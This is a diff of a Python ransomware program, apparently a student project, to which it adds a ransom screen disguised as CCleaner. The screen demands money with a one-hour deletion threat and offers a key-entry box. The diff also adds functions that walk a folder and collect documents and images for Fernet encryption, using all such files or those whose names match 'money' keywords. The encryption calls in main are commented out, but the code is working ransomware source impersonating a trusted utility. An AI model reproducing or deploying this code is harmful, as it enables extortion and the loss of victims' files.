@@ -1,13 +1,47 @@
 import os
 import string
+from tkinter import *
+from PIL import ImageTk, Image
+import time
 from cryptography.fernet import Fernet
+
+# GUI stuff -----------------------------------------------------------------------------------------------------------------------------------------------
+root = Tk()
+root.title("CCleaner, totally not Ransomware ( ͡° ͜ʖ ͡°)")
+root.iconbitmap('ccleaner.ico')
+root.geometry("1035x660")
+root.configure(bg = 'red')
+
+skull_image = ImageTk.PhotoImage(Image.open("crossbones.png"))
+image_label1 = Label(image = skull_image, bg = 'red')
+image_label2 = Label(image = skull_image, bg = 'red')
+image_label3 = Label(image = skull_image, bg = 'red')
+image_label4 = Label(image = skull_image, bg = 'red')
+
+image_label1.grid(row = 0, column = 0)
+image_label2.grid(row = 0, column = 4)
+image_label3.grid(row = 4, column = 0)
+image_label4.grid(row = 4, column = 4)
+
+
+main_text = Label(root, text="You just got hacked.\nYour money files are encrypted.\nSend monies or your files will be deleted in one hour.", font = ('Arial', 18), fg = 'white', bg = 'red')
+main_text.grid(row = 1, column = 1)
+
+e = Entry(root, width = 50, borderwidth = 5)
+e.grid(row = 2, column = 1, padx = 10, pady = 10)
+e.insert(0, "Enter Key Here")
+
+b = Button(root, text = "Decrypt", width = 13, height = 2, borderwidth = 5, font = ('Arial', 18))
+b.grid(row = 3, column = 1)
+
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # safeguard = input("Please enter the safeguard password:")
 # if safeguard != 'start':
 #     quit()
 
 #creates list of files of certain extensions within given folder
-def generate_file_list(path):
+def generate_file_list_keyword(path):
     encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg')
     file_paths = []
     rfile = open('MoneyWords.txt', 'r')
@@ -17,8 +51,18 @@ def generate_file_list(path):
             for w in words:
                 file_name,file_ext = os.path.splitext(root+'\\'+file)
                 if w in ''.join([c for c in file_name.lower() if c.islower()]) and file_ext in encrypted_ext:
-
                         file_paths.append(root+'\\'+file)
+    print(file_paths)
+    return file_paths
+
+def generate_file_list(path):
+    encrypted_ext = ('.txt','.pdf','.docx','.doc','.png','.jpg','.jpeg')
+    file_paths = []
+    for root, dirs, files, in os.walk(path):
+        for file in files:
+            file_name,file_ext = os.path.splitext(root+'\\'+file)
+            if file_ext in encrypted_ext:
+                file_paths.append(root+'\\'+file)
     print(file_paths)
     return file_paths
 
@@ -64,13 +108,13 @@ def decrypt_files(file_paths, fernet):
             dec_file.write(decrypted)
 
 #returns whether a keyword was found in a file (only tested with .txt)
-def keyword_check(keyword, f):
-    file = open(f, 'r').read()
-    for word in file.split():       
-        word = word.translate(str.maketrans('', '', string.punctuation))
-        if word.lower() == keyword:
-            return True
-    return False
+# def keyword_check(keyword, f):
+#     file = open(f, 'r').read()
+#     for word in file.split():       
+#         word = word.translate(str.maketrans('', '', string.punctuation))
+#         if word.lower() == keyword:
+#             return True
+#     return False
 
 #returns whether a file is encrypted or not
 def isEncrypted(f):
@@ -123,12 +167,13 @@ def decrypt(file_paths):
 def main():
     #will need to get current working directory or something later
     # file_paths = generate_file_list('C:\\Users\\ericw\\Documents\\CECS378Test')
-    file_paths = generate_file_list('C:\\Users\\bwiit\\Documents\\CECS378Test')
-
+    file_paths = generate_file_list_keyword('C:\\Users\\bwiit\\Documents\\CECS378Test')
+    # write_key()
     # encrypt_keyword(file_paths, "a")
     # decrypt(file_paths)
 
 if __name__ == "__main__":
     main()
 
-
+# Also GUI
+root.mainloop()
